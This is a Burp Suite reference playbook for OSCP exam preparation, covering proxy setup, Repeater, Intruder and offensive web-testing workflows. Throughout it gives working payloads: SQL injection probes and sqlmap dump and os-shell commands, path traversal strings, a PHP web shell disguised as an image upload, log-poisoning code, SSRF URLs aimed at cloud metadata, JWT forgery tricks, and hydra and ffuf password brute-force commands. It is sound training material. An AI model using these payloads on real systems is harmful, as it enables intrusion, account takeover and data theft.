# Burp Suite — OSCP Playbook

Burp Suite is the workbench for every web target. This file is the end-to-end reference: setup, every major tool, the OSCP workflows that use it, and the gotchas that waste time. Burp Community Edition (CE) ships in Kali by default; Professional (Pro) adds Scanner and removes Intruder's rate limit. **CE is sufficient for the OSCP exam** — you'll just lean on `ffuf` / `wfuzz` for high-throughput fuzzing where Pro's Intruder would shine.

---

## Table of Contents

1. [Setup — First Run](#1-setup--first-run)
2. [Browser Configuration](#2-browser-configuration)
3. [Scope, Target, Site Map](#3-scope-target-site-map)
4. [Proxy — Intercept & HTTP History](#4-proxy--intercept--http-history)
5. [Repeater — The Workhorse](#5-repeater--the-workhorse)
6. [Intruder — Brute Force & Fuzzing](#6-intruder--brute-force--fuzzing)
7. [Decoder](#7-decoder)
8. [Comparer](#8-comparer)
9. [Sequencer](#9-sequencer)
10. [Match and Replace](#10-match-and-replace)
11. [Extensions — The OSCP Shortlist](#11-extensions--the-oscp-shortlist)
12. [Common OSCP Workflows](#12-common-oscp-workflows)
13. [Saving Sessions](#13-saving-sessions)
14. [CE vs Pro — What You Lose](#14-ce-vs-pro--what-you-lose)
15. [Gotchas](#15-gotchas)
16. [Keyboard Shortcuts](#16-keyboard-shortcuts)
17. [Cheat — One-Page Recall](#17-cheat--one-page-recall)

---

## 1. Setup — First Run

### Launching

```bash
# Kali (default install)
burpsuite                 # CE or Pro depending on what's installed
sudo apt install burpsuite-pro    # if you have a Pro license (rare for OSCP)
```

First-run dialog:
- **Temporary project** (CE only) — fine for exam, state is lost on exit
- **New project on disk** (Pro only) — saves Site Map, history, Repeater tabs across restarts
- **Use Burp defaults** for config the first time, then save a config later if you customize.

### Project File (Pro only)

```
File → Save copy of project as ...     # snapshot
File → Open project                    # reload
```

For OSCP: open with `burpsuite --project-file=/root/exam/burp.btp --config-file=/root/exam/burp-config.json` to auto-load on launch.

### Initial UI Tour

| Tab            | What it's for                                              |
|----------------|------------------------------------------------------------|
| **Dashboard**  | Tasks (live passive scan), event log, issue activity       |
| **Target**     | Site Map, Scope settings, Issue definitions                |
| **Proxy**      | Intercept, HTTP history, WebSocket history, Options        |
| **Intruder**   | Automated request manipulation (brute force, fuzzing)      |
| **Repeater**   | Manual single-request edit/replay                          |
| **Sequencer**  | Token randomness analysis (rarely needed on OSCP)          |
| **Decoder**    | Encode/decode (base64, URL, HTML, hex, ASCII-hex, gzip)    |
| **Comparer**   | Side-by-side diff of two requests or responses             |
| **Logger**     | Pro: history of every HTTP request from every Burp tool    |
| **Extender**   | BApp Store and custom extensions                           |

### Increase Burp's RAM

Default heap is 1–2 GB; not enough for big Intruder runs.

```bash
# Edit launcher (or run directly)
java -jar -Xmx4g /path/to/burpsuite_community.jar
# Kali Pro launcher: edit /usr/bin/burpsuite — change -Xmx
```

---

## 2. Browser Configuration

### Foxy Proxy (Firefox — recommended)

Install **FoxyProxy Standard** from Firefox add-ons. Add a proxy:

```
Title:    Burp
Proxy IP: 127.0.0.1
Port:     8080
Type:     HTTP
```

Toggle via toolbar icon — much faster than digging through Firefox network settings.

### Manual proxy

Firefox → `about:preferences#general` → Network Settings → **Manual proxy** → `127.0.0.1:8080` for HTTP and HTTPS. Tick "Also use this proxy for HTTPS" and **un-tick** "No proxy for: localhost, 127.0.0.1" if you need to intercept local Kali traffic.

### Burp's Embedded Chromium

Proxy → **Open browser** — pre-configured, CA cert already trusted. Zero setup. Use this when:
- You don't want to fight with Firefox cert issues
- You're testing on a fresh VM with no Foxy Proxy
- You want a clean cookie jar (no leakage from your normal browsing)

### Installing Burp's CA Certificate (HTTPS intercept)

Without the cert, every HTTPS site shows a TLS warning and Burp can't decrypt.

```
1. Browser → http://burp   (must be while Burp is the proxy)
2. Top-right → CA Certificate → download cacert.der
3. Firefox: about:preferences#privacy → View Certificates → Authorities → Import
4. Tick "Trust this CA to identify websites"
```

For Chrome on Kali — import to system trust:

```bash
# Convert DER to PEM
openssl x509 -in ~/Downloads/cacert.der -inform DER -out burp.crt
sudo cp burp.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates
```

**Gotcha:** if you regenerate Burp's CA (e.g., switch project or "Regenerate CA certificate"), every browser will reject HTTPS until you re-import. The cert changes per-installation but persists across Burp restarts.

---

## 3. Scope, Target, Site Map

### Setting Target Scope

`Target → Scope` → **Add** → enter host (regex or literal).

```
Include in scope:
  Protocol:  Any
  Host:      ^acme\.htb$|^.*\.acme\.htb$
  Port:      .*
  File:      .*
```

Why scope matters:
- Filter HTTP history to in-scope only (much less noise from Firefox telemetry, OCSP, etc.)
- Send to Repeater/Intruder ignores out-of-scope inadvertent clicks
- Logger++ filtering keys on scope

After setting scope: `Proxy → HTTP history → Filter` → tick **Show only in-scope items**.

```
Settings → Sessions → Tools scope     # apply scope to Spider/Scanner/Intruder/Repeater
```

### Site Map

`Target → Site map` — tree of every URL Burp has seen. Right-click a node:

| Action                              | Use                                                 |
|-------------------------------------|-----------------------------------------------------|
| **Add to scope**                    | Sets scope from the URL                             |
| **Spider this host** (Pro)          | Crawls — usually superseded by feroxbuster anyway   |
| **Engagement tools → Find comments**| Pull HTML/JS comments — often leaks debug paths     |
| **Engagement tools → Find scripts** | Enumerate all loaded JS — feed to grep              |
| **Engagement tools → Analyze target**| Pro: parameter/cookie/static-resource summary      |
| **Copy URLs in this branch**        | Build a wordlist of discovered paths                |

### Issue Definitions

`Target → Issue definitions` — every passive/active scan check with description. Useful as a learning reference, not actionable during the exam.

---

## 4. Proxy — Intercept & HTTP History

### Intercept Toggle

`Proxy → Intercept` → button `Intercept is on/off`. Keep it **off** during browsing and flip on only when you need to grab/modify a specific request — otherwise every image and OCSP request stalls.

Per-request actions (when intercepted):
- **Forward** — send as-is (also `Ctrl+F`)
- **Drop** — kill it (don't break the app — use sparingly)
- **Action → Send to Repeater** (`Ctrl+R`)
- **Action → Send to Intruder** (`Ctrl+I`)

### Intercept Match Rules

`Proxy → Options → Intercept Client Requests` — only intercept when:
- URL is in scope (huge noise reducer)
- Method is POST (skip image/JS GETs)
- File extension does NOT match `\.(gif|jpg|png|css|js|ico|woff2?)$`

This single change makes interception usable. Default config catches everything.

### HTTP History

`Proxy → HTTP history` — full record of every request through the proxy. The most-used view in all of Burp.

| Column     | Sortable | What you scan for                              |
|------------|----------|------------------------------------------------|
| Method     | yes      | POST = user input, worth examining             |
| URL        | yes      | Endpoints                                      |
| Params     | yes      | `✓` means the request had query/body params    |
| Edited     | yes      | `✓` if you sent a modified version             |
| Status     | yes      | 500 errors leak stack traces; 302 = login flows|
| Length     | yes      | **Critical** for blind detection diffs         |
| MIME       | yes      | Filter JSON-only / HTML-only                   |
| Comment    | yes      | Add notes (`Right-click → Add comment`)        |

### Filter Bar

Click the filter bar above HTTP history:

```
Filter by request type:
  ☑ Show only in-scope items
  ☑ Show only parameterized requests
  ☐ Hide items without responses

Filter by MIME type:
  ☑ HTML  ☑ Script  ☑ JSON  ☑ XML
  ☐ Images  ☐ CSS  ☐ Other binary

Filter by status code:
  Show only 2xx 3xx 4xx 5xx

Filter by search term:
  admin            (matches URL and parameters)
```

### Right-Click Actions (memorize these)

| Action                              | Where it sends                                |
|-------------------------------------|-----------------------------------------------|
| **Send to Repeater**                | Manual edit/replay (most common)              |
| **Send to Intruder**                | Automated payload position fuzzing            |
| **Send to Comparer (request)**      | Diff against another request                  |
| **Send to Comparer (response)**     | Diff against another response                 |
| **Send to Decoder**                 | Decode a base64/URL-encoded value             |
| **Copy as curl command**            | Reproduce outside Burp                        |
| **Copy as PowerShell**              | Reproduce on Windows attack box               |
| **Save item**                       | XML — feed to other tools                     |
| **Copy to file**                    | **Raw HTTP** — feed to `sqlmap -r file`       |
| **Engagement tools → Generate CSRF PoC** | Build a one-click attack page            |

**Gotcha:** "Copy as curl" includes every cookie and header — it's a faithful reproduction, but if you're sharing the command, sanitize first.

---

## 5. Repeater — The Workhorse

Repeater is where 80 % of your Burp time goes. Send a captured request here, modify, click **Send**, read the response. Iterate.

### Workflow

1. Browse the app once with Intercept off — populate HTTP history.
2. Find the interesting request in HTTP history.
3. Right-click → **Send to Repeater** (`Ctrl+R`).
4. Switch to the **Repeater** tab (`Ctrl+Shift+R`).
5. Edit the request on the left, **Send**, read the response on the right.
6. Use the **<** and **>** arrows above the request to step through previous edits.

### Tabs

- **Rename tabs** by double-clicking — e.g. `login`, `search?q=`, `LFI ?file=`.
- Right-click tab → **Pin tab** to keep position; **Duplicate** to fork a variation.
- Right-click → **Save tab to file** to preserve a request across sessions (CE has no project save).

### Keyboard shortcuts

| Action                | Shortcut         |
|-----------------------|------------------|
| Send request          | `Ctrl+Space`     |
| Switch to Repeater    | `Ctrl+Shift+R`   |
| New tab               | `Ctrl+T`         |
| Close tab             | `Ctrl+W`         |
| Next tab / Prev tab   | `Ctrl+Tab` / `Ctrl+Shift+Tab` |
| URL-decode selection  | `Ctrl+Shift+U`   |
| URL-encode selection  | `Ctrl+U`         |
| Comment selected      | `Ctrl+/`         |
| Cut/Copy/Paste        | standard         |

### Useful patterns

**SQLi probe iteration** — paste the standard set, send each:

```http
GET /product?id=1' HTTP/1.1
GET /product?id=1'%20OR%20'1'='1 HTTP/1.1
GET /product?id=1%20UNION%20SELECT%20NULL HTTP/1.1
GET /product?id=1%20UNION%20SELECT%20NULL,NULL HTTP/1.1
GET /product?id=1%20UNION%20SELECT%20NULL,NULL,NULL HTTP/1.1
```

Watch the **Length** of each response — column-count mismatch breaks the page; correct count returns content.

**Cookie manipulation** — change a value, observe authorization behavior:

```http
Cookie: PHPSESSID=abc123; role=admin     # was role=user
```

**HTTP verb tampering** — change `GET` to `POST`, `PUT`, `DELETE`. Some apps only restrict GET-based auth.

```http
POST /admin HTTP/1.1                     # was GET
```

**Header injection** — toy with auth/identity headers:

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
Host: admin.acme.htb                     # virtual-host trick
```

**Content-Type swap** — JSON ↔ XML to trigger XXE; URL-encoded ↔ multipart to bypass filters.

```http
Content-Type: application/xml            # was application/json — try XXE
```

**Path traversal iteration**:

```
?file=../etc/passwd
?file=....//etc/passwd
?file=..%2fetc%2fpasswd
?file=%252e%252e%252fetc%252fpasswd
?file=php://filter/convert.base64-encode/resource=index.php
```

---

## 6. Intruder — Brute Force & Fuzzing

Intruder takes a request, lets you mark **payload positions** (`§ ... §`), then iterates payloads through them.

**CE warning:** Community Edition throttles Intruder to ~1 request per second (artificial sleep). Login brute force, mask attacks, anything > 100 requests — use `ffuf` / `wfuzz` / `hydra` instead. Intruder in CE is still useful for **small** payload sets where the value is the diff, not the throughput (e.g. trying 20 different SQLi payloads and comparing response sizes).

### Attack Types

| Type             | Payload sets | Behavior                                                                    |
|------------------|--------------|-----------------------------------------------------------------------------|
| **Sniper**       | 1            | One position at a time. N positions × M payloads = N·M requests             |
| **Battering Ram**| 1            | Same payload in every position simultaneously                               |
| **Pitchfork**    | N (max 8)    | Parallel — payload[i] for set 1 paired with payload[i] for set 2, ...       |
| **Cluster Bomb** | N (max 8)    | All combinations — payload sets × each other (Cartesian product)            |

**Pick by goal:**

| Goal                                           | Attack Type     |
|------------------------------------------------|-----------------|
| Try N payloads in one parameter (SQLi probes)  | Sniper          |
| Same value in 2+ places (passwords reused)     | Battering Ram   |
| Known user → password list (per-user pair)     | Pitchfork       |
| Full credential spray (every user × every pw)  | Cluster Bomb    |

### Setting Positions (§ markers)

1. **Send to Intruder** from Repeater or HTTP history.
2. **Positions** tab — Burp auto-marks all params with `§`.
3. Click **Clear §** to wipe them, then highlight the value you actually want to fuzz and click **Add §**.

```http
POST /login HTTP/1.1
Host: acme.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

username=§admin§&password=§password§
```

### Payload Types (Sniper / each position)

| Type                       | Use                                                |
|----------------------------|----------------------------------------------------|
| **Simple list**            | Wordlist (paste from clipboard or load from file)  |
| **Runtime file**           | Stream from disk — needed for `rockyou.txt` size   |
| **Numbers**                | `1` → `9999`, step 1 — IDOR / ID iteration         |
| **Brute forcer**           | Custom charset × length (slow without Pro)         |
| **Character substitution** | `a→@`, `o→0`, `s→$` — leet variants                |
| **Case modification**      | toupper/tolower/initcap                            |
| **Username generator**     | First/last name → `j.smith`, `jsmith`, `john.smith`|
| **Recursive grep**         | Use response from previous request as next payload |
| **Null payloads**          | Send N copies of the same request (e.g. for timing)|

### Grep — Match / Extract

`Settings → Grep — Match`:

```
Add patterns to flag responses (column appears in results):
  Welcome
  Invalid
  error
  SQL syntax
  redirect_uri
  302
```

`Settings → Grep — Extract` — pulls a regex-matched piece into a results column. Useful for CSRF token extraction during multi-step brute force.

`Settings → Grep — Payloads` — flag responses that echo the payload back (XSS / SSTI surface).

### Resource Pool (throttling)

`Resource Pool` tab → New pool → set delay / concurrency. Use for rate-limited endpoints (login forms with lockout, APIs with `429`).

### Community Edition Throttle

There is no UI to disable the ~1-second CE delay. Options:

- Use CE for small, careful runs (< 50 requests)
- Use `ffuf` for HTTP fuzzing:

```bash
ffuf -u "http://acme.htb/login" -X POST \
     -d "username=admin&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -w /usr/share/seclists/Passwords/rockyou.txt \
     -fs 1234                       # filter "invalid" response size
```

- Use `hydra` for login forms specifically:

```bash
hydra -l admin -P rockyou.txt acme.htb http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid"
```

### Real-World Examples

**A. Login brute force (single user, password list)** — Pitchfork, payload set 1 = `admin`, payload set 2 = wordlist. Grep-match `Invalid`. Sort by response length to spot the success.

**B. Username enumeration** — Sniper at the username field, payload = name list. Watch for response size delta or timing delta (`Settings → Grep — Time` in Pro). Different error messages for "user not found" vs "wrong password" leak valid users.

**C. Credential spray** — Cluster Bomb, set 1 = small user list, set 2 = `Summer2025!`, `Welcome1`, `Password123`. Same password tried against every user.

**D. Parameter fuzzing** — Sniper on the parameter *name* (not value):

```http
GET /api?§FUZZ§=test HTTP/1.1
```

Payload = `seclists/Discovery/Web-Content/burp-parameter-names.txt`. Grep-match: status `200` and length delta vs baseline. In CE, prefer `ffuf` with `-w wordlist:FUZZ` for speed.

**E. Numeric ID iteration (IDOR)** — Sniper, payload type = Numbers, range 1–500. Grep-extract the user's email or role to spot accounts you can read that you shouldn't.

---

## 7. Decoder

Bottom pane is decoded output; top is input. Chain decodes by clicking the result and decoding again.

| Encoding         | When you see it                                |
|------------------|------------------------------------------------|
| **URL**          | `%20`, `%2F`, `+` for spaces — query params    |
| **HTML**         | `&lt;`, `&#x27;` — reflected XSS sinks         |
| **Base64**       | Trailing `=`, `=` chars; JWTs are 3 b64 parts  |
| **ASCII hex**    | `0x` prefixes, even-length hex strings         |
| **Hex**          | Raw binary representation                      |
| **Octal / Binary**| Rare                                          |
| **Gzip**         | `1f 8b 08` magic bytes — sometimes in cookies  |

**Smart decode** button — Burp guesses the chain. Often wrong; use manual.

**Right-click → Send to Decoder** from anywhere in Burp instead of copy-paste.

---

## 8. Comparer

Sends two items (request or response) side-by-side, highlights differences word/byte-wise.

**Killer use case — blind SQLi:**

```
Request A: ?id=1 AND 1=1     →  send response to Comparer
Request B: ?id=1 AND 1=2     →  send response to Comparer
Comparer → Words            →  diff word-by-word → see the rows that vanish
```

Other uses:
- Diff a login response when valid vs invalid user
- Diff response when a header is/isn't present
- Diff two error messages to spot which database engine is running

---

## 9. Sequencer

Analyzes randomness of session tokens / CSRF tokens / password reset tokens.

`Live capture` → paste request that issues the token → set the location of the token in the response → `Start live capture` → run for 200+ samples → analyze.

Rarely needed on OSCP — exam tokens are almost never the bottleneck. Worth knowing exists.

---

## 10. Match and Replace

`Settings → Tools → Proxy → Match and replace rules` — global rewrite for every request/response.

Common rules:

| Match                          | Replace                              | Why                                                     |
|--------------------------------|--------------------------------------|---------------------------------------------------------|
| Request header `User-Agent: .*`| `User-Agent: Mozilla/5.0 (custom)`   | Bypass UA-based filters                                 |
| Request header `X-Forwarded-For:.*` | `X-Forwarded-For: 127.0.0.1`    | Auto-add to every request                               |
| Response header `X-Frame-Options:.*` | (empty)                        | Allow framing for clickjacking PoC                      |
| Response header `Content-Security-Policy:.*` | (empty)                | Test XSS without CSP getting in the way                 |
| Response body `<script src="csrf.js"></script>` | (empty)             | Strip token-binding JS so you can replay requests       |
| Request body `csrf_token=[a-f0-9]+` | `csrf_token=`                   | Test if CSRF token is actually validated                |

**Gotcha:** rules apply to ALL traffic, including out-of-scope. Tick "Only request URLs match" and add a URL filter, or disable rules between engagements.

---

## 11. Extensions — The OSCP Shortlist

`Extender → BApp Store` — install from there. Most extensions require Pro; CE-compatible ones flagged below.

| Extension          | CE? | Why                                                              |
|--------------------|-----|------------------------------------------------------------------|
| **Logger++**       | yes | Searchable history across ALL Burp tools (Logger only does proxy)|
| **JWT Editor**     | yes | Decode + tamper JWT in the request view (alg=none, key confusion)|
| **Hackvertor**     | yes | Inline tags: `<@base64>` `<@urlencode>` `<@md5>` — chain in request|
| **Authorize**      | yes | Compare request with/without auth header — IDOR / authz testing  |
| **Turbo Intruder** | yes | Pure Python, **bypasses CE throttle**, race-condition friendly   |
| **Param Miner**    | Pro | Find hidden headers/params by cache-poisoning differences        |
| **Active Scan++**  | Pro | Adds custom checks to the Pro Scanner                            |
| **Backslash Powered Scanner** | Pro | Variant analysis — finds non-obvious injection paths     |

### Installing

```
Extender → BApp Store → select → Install
# Or load a .py / .jar manually:
Extender → Extensions → Add → Extension type: Python/Java → file path
```

**For Python extensions** — install Jython: `Extender → Options → Python Environment → Select file → /opt/jython.jar`

---

## 12. Common OSCP Workflows

### A. SQLi: Discovery in Burp → exploit with sqlmap

1. Browse, find an injection point (probes in Repeater confirm `error`/`length` delta).
2. Capture the full request in HTTP history.
3. Right-click → **Copy to file** → `/tmp/sqli.req`.
4. Run sqlmap against the saved request:

```bash
sqlmap -r /tmp/sqli.req -p username --batch --level=3 --risk=2
sqlmap -r /tmp/sqli.req --dbs                       # list databases
sqlmap -r /tmp/sqli.req -D acme -T users --dump     # dump table
sqlmap -r /tmp/sqli.req --os-shell                  # if RCE possible (FILE priv / xp_cmdshell)
```

**Gotcha:** `-r` preserves cookies, headers, and method. Beats trying to reconstruct the request with `--cookie` / `--data` flags.

### B. LFI parameter discovery

1. Browse, watch HTTP history for any URL with a file-like param (`?page=`, `?include=`, `?lang=`).
2. Send to Repeater.
3. Iterate:

```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index
?page=../../../../var/log/apache2/access.log
```

4. If LFI confirmed → poison log via `User-Agent: <?php system($_GET[0]); ?>` (in Repeater, edit the header on the next request to the log file), then include the log:

```
?page=../../../var/log/apache2/access.log&0=id
```

### C. File upload analysis

1. Submit a clean upload through the browser.
2. In HTTP history, find the multipart POST.
3. Send to Repeater.
4. Modify in the body — extension, MIME, magic bytes, double extensions:

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=---x

-----x
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: image/png

GIF89a;
<?php system($_GET['cmd']); ?>
-----x--
```

Iterate filename / Content-Type / magic bytes. See [Web-Attacks.md §6](Web-Attacks.md#6-file-upload--bypasses-and-shells) for the bypass ladder.

### D. Login brute force without Pro

CE Intruder is too slow. Three options ranked:

1. **Hydra** (fastest for forms):

```bash
# Get the failure string from Burp first (e.g. "Invalid credentials")
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  acme.htb http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```

2. **ffuf** (when you need control over headers/JSON):

```bash
ffuf -u http://acme.htb/login -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w rockyou.txt -fr "Invalid"
```

3. **Turbo Intruder** (in Burp, bypasses CE throttle):

```
# Right-click request → Send to Turbo Intruder
# Default config runs ~1000 req/s on localhost
```

### E. Cookie / session tampering

1. Capture an authenticated request in HTTP history.
2. Repeater → edit `Cookie:` header.
3. Try: removing flags (`role=user` → `role=admin`), base64-decoding cookie values, swapping a captured token from a low-priv account into a high-priv request.

If the cookie is a JWT — use the **JWT Editor** extension tab in Repeater.

### F. JWT modification

JWT format: `header.payload.signature` — each base64url-encoded.

With **JWT Editor**:

1. Send request to Repeater.
2. Click the JWT Editor tab on the right.
3. Decode → edit payload (e.g. `"role": "admin"`) → re-sign:
   - **`alg=none`** — strip signature, set `alg: none` in header (some libs accept)
   - **Key confusion** (RS256 → HS256) — sign with the public RSA key as HMAC secret
   - **Weak HMAC** — crack offline:

```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# 16500 = JWT HS256/384/512
```

Without the extension: decode each part with Decoder, edit, re-encode, paste back.

### G. Header injection on internal SSRF

Capture an SSRF-able request (a URL field, image proxy, PDF generator). In Repeater, swap the URL:

```
url=http://127.0.0.1/admin
url=http://169.254.169.254/latest/meta-data/         # AWS metadata
url=http://localhost:8080/                           # internal service
url=file:///etc/passwd                               # file scheme
url=gopher://127.0.0.1:6379/_INFO                    # Redis SSRF
```

Watch the response. Combine with **Match and Replace** to auto-add `X-Forwarded-For: 127.0.0.1` if the app gates internal URLs by source IP.

### H. Tampering CSRF tokens

In Repeater, delete the `csrf_token` parameter entirely. If the request still succeeds — CSRF is broken. If it fails — the token is enforced; try replaying an old token, an empty token, a token from a different session.

For multi-step Intruder runs that need a fresh token per request — `Settings → Grep — Extract` the new token from the response, then use **Recursive grep** payload type to feed it into the next request.

### I. WebSocket / chunked / multipart edge cases

- **Proxy → WebSockets history** — separate from HTTP history. Send to Repeater (Pro only); CE: right-click → "Intercept this message" and edit inline.
- **Chunked encoding** — Burp respects it. If a server reflects payloads through chunked, you may need to send raw bytes via the **Inspector** panel (Pro) or `curl --raw`.
- **Multipart bodies** — edit between the `boundary=---x` markers; Burp will not auto-fix `Content-Length` if you change body size, but **Update Content-Length** is on by default (Repeater right-click).

---

## 13. Saving Sessions

### CE Workaround (no project file)

| What                       | How to save                                                 |
|----------------------------|-------------------------------------------------------------|
| Single Repeater tab        | Right-click tab → **Save tab to file**                      |
| HTTP history               | `Proxy → HTTP history → select all → right-click → Save items` (XML) |
| Configuration              | `Settings → Save settings` → JSON                            |
| Site map                   | `Target → Site map → right-click root → Save selected items`|

Reload an XML history dump: `Proxy → HTTP history → right-click empty → Import items`.

### Pro: project file

```
File → Save project       # interval recommended every hour during exam
File → Open project       # full restore — every Repeater tab, scope, history
```

---

## 14. CE vs Pro — What You Lose

| Feature                       | CE       | Pro                                  |
|-------------------------------|----------|--------------------------------------|
| Proxy / HTTP history          | ✓        | ✓                                    |
| Repeater                      | ✓        | ✓                                    |
| Intruder                      | throttled (~1 req/s) | full speed (thousands/s) |
| Scanner (passive + active)    | ✗        | ✓                                    |
| Project file (save state)     | ✗        | ✓                                    |
| Collaborator (OOB testing)    | limited public  | private server                |
| Extensions requiring Scanner  | ✗        | ✓                                    |
| Inspector (live request edit) | basic    | full                                 |
| HTTP/2                        | ✓        | ✓                                    |

For OSCP — CE is enough. The throttle is the only consistent annoyance and you route around it with `ffuf` / `hydra` / Turbo Intruder.

---

## 15. Gotchas

- **Intercept-on with images** — every page load stalls because Burp queues GIFs/CSS. Set intercept match rules early (see §4) or just keep it off until you need it.
- **Content-Length** — if you edit a request body in Repeater and forget to update Content-Length, the server may truncate or reject. Repeater auto-updates by default; if you've disabled it, right-click → **Update Content-Length**.
- **HTTPS to non-trusted hosts** — Burp will MITM but Chromium/Firefox may refuse. Re-install the CA cert.
- **CE Intruder throttle is silent** — no banner, no warning. If your Intruder run feels glacial, it is.
- **Match-and-replace stays on across engagements** — turn off when you switch targets, especially "strip CSP" rules.
- **The proxy listener binds to 127.0.0.1 only** by default. If you proxy a Windows VM through your Kali — `Proxy → Options → Edit listener → All interfaces`. Then firewall it.
- **Cookies leak between tabs in same Firefox profile.** If you're testing as user A in one tab and admin B in another, use separate containers (Firefox Multi-Account Containers) or two browsers.
- **Burp doesn't follow redirects in Repeater by default** — `Send` returns the 302; click `Follow redirection` for the destination. In Intruder, `Settings → Redirections → Follow redirections: Always` to fully evaluate the auth flow.
- **JWT signature ≠ payload** — editing the payload without re-signing yields an invalid token. Use JWT Editor, don't hand-edit.
- **Lost Repeater tabs on CE crash** — there is no recovery. Save important tabs to file as you go.
- **Burp doesn't auto-decode** params in the request view. The Inspector pane (right side) shows decoded forms; or `Ctrl+Shift+U` to URL-decode highlighted text.

---

## 16. Keyboard Shortcuts

| Shortcut         | Action                                  |
|------------------|-----------------------------------------|
| `Ctrl+R`         | Send to Repeater                        |
| `Ctrl+I`         | Send to Intruder                        |
| `Ctrl+Shift+R`   | Switch to Repeater                      |
| `Ctrl+Shift+I`   | Switch to Intruder                      |
| `Ctrl+Shift+P`   | Switch to Proxy                         |
| `Ctrl+Space`     | Send request (Repeater)                 |
| `Ctrl+F`         | Forward request (Proxy intercept)       |
| `Ctrl+T`         | New Repeater tab                        |
| `Ctrl+W`         | Close current Repeater tab              |
| `Ctrl+Tab`       | Next tab                                |
| `Ctrl+Shift+Tab` | Previous tab                            |
| `Ctrl+U`         | URL-encode selection                    |
| `Ctrl+Shift+U`   | URL-decode selection                    |
| `Ctrl+B`         | Base64-encode selection                 |
| `Ctrl+Shift+B`   | Base64-decode selection                 |
| `Ctrl+/`         | Add/edit comment on current item        |
| `Ctrl+S`         | Save state (Pro)                        |

---

## 17. Cheat — One-Page Recall

```
LAUNCH
  burpsuite                       # CE = default in Kali
  Open browser (embedded)         # zero-config HTTPS

PROXY
  Foxy Proxy: 127.0.0.1:8080
  CA cert: http://burp → CA Certificate → import as Authority
  Intercept: OFF by default; ON only when grabbing a specific request

SCOPE
  Target → Scope → Add → ^acme\.htb$
  HTTP history filter: ☑ Show only in-scope

REPEATER  (Ctrl+R from HTTP history)
  Edit request → Ctrl+Space to send
  Rename tab to track context: "login", "?file=", "JWT"

INTRUDER  (CE: ~1 req/s — for small, careful runs only)
  Sniper       → 1 payload, 1 position iterating
  Battering Ram→ 1 payload, all positions same
  Pitchfork    → N payloads, paired (user[i] + pass[i])
  Cluster Bomb → N payloads, all combinations (full spray)
  Grep Match: Welcome | Invalid | error | SQL
  → For real brute force use ffuf / hydra / Turbo Intruder

DECODER  URL | HTML | base64 | hex | gzip       (chain decodes)
COMPARER blind SQLi: send id=1 AND 1=1 vs 1=2 → diff Words
MATCH&REPLACE  set XFF on every req; strip CSP for XSS testing

EXTENSIONS (CE-compatible)
  Logger++         all-tools history search
  JWT Editor       decode/tamper JWT inline
  Hackvertor       inline <@base64> <@urlencode> tags
  Authorize        IDOR / authz comparison
  Turbo Intruder   bypass CE throttle (race conditions)

WORKFLOWS
  SQLi    →  HTTP history → Copy to file → sqlmap -r req.txt --batch --dbs
  LFI     →  Repeater iterate ../, php://filter, log poisoning
  Upload  →  Repeater toggle ext / MIME / magic bytes
  Login   →  hydra http-post-form (NOT Intruder in CE)
  Cookie  →  Repeater modify; JWT → JWT Editor tab
  CSRF    →  delete token in Repeater; if still works, broken

SAVE  (CE)
  Repeater tab → right-click → Save tab to file
  HTTP history → select all → Save items (XML)
  Settings → Save settings (JSON config)

GOTCHAS
  Set intercept match rules (skip images/CSS) — or pages stall
  CE Intruder throttle is silent, ~1 req/s
  Update Content-Length on body edits
  Match-and-Replace persists across engagements — turn off when done
```
